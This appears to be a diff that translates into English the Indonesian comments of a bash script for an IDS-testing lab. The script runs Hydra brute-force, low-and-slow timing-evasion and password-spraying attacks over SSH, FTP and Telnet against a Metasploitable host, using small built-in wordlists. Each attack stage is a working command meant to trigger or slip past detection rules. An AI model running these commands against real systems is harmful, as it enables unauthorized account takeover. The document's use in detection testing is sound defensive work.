@@ -1,54 +1,54 @@
 #!/bin/bash
 
 # =================================================================
-# SKENARIO 02: BRUTE FORCE (HYDRA) - ROTASI PAYLOAD
-# Strategi: 3 Level Depth (Noisy, Low-Slow, Password Spraying)
-# Input: Menerima argumen $1 sebagai Nomor Ronde
+# SCENARIO 02: BRUTE FORCE (HYDRA) - PAYLOAD ROTATION
+# Strategy: 3 Level Depth (Noisy, Low-Slow, Password Spraying)
+# Input: Receives argument $1 as the Round Number
 # =================================================================
 
-# Menerima Input Nomor Ronde dari Daily Round
-ROUND=${1:-1} # Default ke ronde 1 jika kosong
+# Receive Input Round Number from Daily Round
+ROUND=${1:-1} # Default to round 1 if empty
 
-# KONFIGURASI
-TARGET_IP="192.168.x.x"   # Ganti dengan IP Metasploitable
-TARGET_USER="msfadmin"       # User valid
+# CONFIGURATION
+TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
+TARGET_USER="msfadmin"       # Valid user
 LOG_FILE="logs/hydra_session_$(date +%F).log"
 
-# Warna untuk Tampilan Laporan
+# Colors for Report Display
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 NC='\033[0m' # No Color
 
 # =================================================================
-# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
-# Mengubah Protokol & Timing berdasarkan fase ronde
+# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
+# Changes the protocol and timing based on the round phase
 # =================================================================
 if [ "$ROUND" -le 10 ]; then
-    # --- SET A (Ronde 1-10) ---
-    # Protokol: SSH (Default)
+    # --- SET A (Round 1-10) ---
+    # Protocol: SSH (Default)
     SERVICE_PROTO="ssh"
-    # Level 2 Timing: Jeda 5 detik
+    # Level 2 Timing: 5-second delay
     WAIT_TIME="5"
     DESC="SSH Brute Force (Port 22)"
 
 elif [ "$ROUND" -le 20 ]; then
-    # --- SET B (Ronde 11-20) ---
-    # Protokol: FTP (Port 21)
+    # --- SET B (Round 11-20) ---
+    # Protocol: FTP (Port 21)
     SERVICE_PROTO="ftp"
-    # Level 2 Timing: Jeda 15 detik (Lebih lambat)
+    # Level 2 Timing: 15-second delay (slower)
     WAIT_TIME="15"
     DESC="FTP Brute Force (Port 21)"
 
 else
-    # --- SET C (Ronde 21-30) ---
-    # Protokol: Telnet (Port 23)
+    # --- SET C (Round 21-30) ---
+    # Protocol: Telnet (Port 23)
     SERVICE_PROTO="telnet"
-    # Level 2 Timing: Jeda 30 detik (Sangat lambat)
+    # Level 2 Timing: 30-second delay (very slow)
     WAIT_TIME="30"
     DESC="Telnet Brute Force (Port 23)"
 fi
 
-# MEMBUAT WORDLIST DUMMY
+# CREATE DUMMY WORDLIST
 echo "123456" > logs/pass_short.txt
 echo "password" >> logs/pass_short.txt
 echo "admin123" >> logs/pass_short.txt
@@ -81,66 +81,66 @@ echo "debian" >> logs/user_list.txt
 echo "centos" >> logs/user_list.txt
 echo "msfadmin" >> logs/user_list.txt
 
-echo "[+] [02_HYDRA] Memulai Skenario Brute Force..."
+echo "[+] [02_HYDRA] Starting Brute Force Scenario..."
 echo "[+] Target: $TARGET_IP"
-echo "[+] Mode: Ronde $ROUND ($DESC)"
-echo "[+] Waktu Mulai: $(date)"
+echo "[+] Mode: Round $ROUND ($DESC)"
+echo "[+] Start Time: $(date)"
 
 # -----------------------------------------------------------------
 # LEVEL 1: NOISY ATTACK (Traditional Brute Force)
-# Tujuan: Baseline. Menguji deteksi threshold login gagal.
-# Teknik: Parallel tasks (-t 4), cepat.
+# Goal: Baseline. Test failed login detection threshold.
+# Technique: Parallel tasks (-t 4), fast.
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 1] Running Fast Brute Force (-t 4) on $SERVICE_PROTO...${NC}"
 
-# Simpan Command (Menggunakan variabel $SERVICE_PROTO)
+# Store command (using $SERVICE_PROTO variable)
 CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 4 -V"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command (Log file unik per ronde)
+# Execute the command (unique log file per round)
 $CMD -o logs/hydra_lvl1_r${ROUND}.txt > /dev/null 2>&1
-echo "    -> Selesai. (Harapan: Alert ET SCAN / Brute Force)"
+echo "    -> Completed. (Expected: ET SCAN / Brute Force alerts)"
 sleep 10
 
 # -----------------------------------------------------------------
 # LEVEL 2: LOW & SLOW (Timing Evasion)
-# Tujuan: Menguji "Threshold" time window di IDS.
-# Teknik: Single task (-t 1) dengan jeda waktu variabel $WAIT_TIME.
+# Goal: Test the IDS time window threshold.
+# Technique: Single task (-t 1) with variable delay $WAIT_TIME.
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 2] Running Low-Slow Attack (-w $WAIT_TIME) on $SERVICE_PROTO...${NC}"
 
-# Simpan Command (Menggunakan variabel $WAIT_TIME)
+# Store command (using $WAIT_TIME variable)
 CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 1 -w $WAIT_TIME"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command
+# Execute the command
 $CMD -o logs/hydra_lvl2_r${ROUND}.txt > /dev/null 2>&1
-echo "    -> Selesai. (Harapan: Mungkin False Negative / Tidak ada alert)"
+echo "    -> Completed. (Expected: Possible false negative / no alert)"
 sleep 5
 
 # -----------------------------------------------------------------
 # LEVEL 3: PASSWORD SPRAYING (Reverse Brute Force)
-# Tujuan: Menghindari rule standar "1 IP ke 1 User".
-# Teknik: Mencoba 1 Password ke Banyak User.
+# Goal: Avoid the standard rule of "1 IP to 1 User".
+# Technique: Try 1 password against many users.
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 3] Running Password Spraying on $SERVICE_PROTO...${NC}"
 
-# Simpan Command
+# Store the command
 CMD="hydra -L logs/user_list.txt -p password123 $SERVICE_PROTO://$TARGET_IP -t 4"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command
+# Execute the command
 $CMD -o logs/hydra_lvl3_r${ROUND}.txt > /dev/null 2>&1
-echo "    -> Selesai. (Harapan: Alert berbeda/spesifik Spraying)"
+echo "    -> Completed. (Expected: Different/specific spraying alert)"
 
-# BERSIH-BERSIH
+# CLEANUP
 rm logs/pass_short.txt logs/user_list.txt
 
-echo "[+] [02_HYDRA] Skenario Selesai pada $(date)"
+echo "[+] [02_HYDRA] Scenario Completed at $(date)"
 echo "-----------------------------------------------------------"
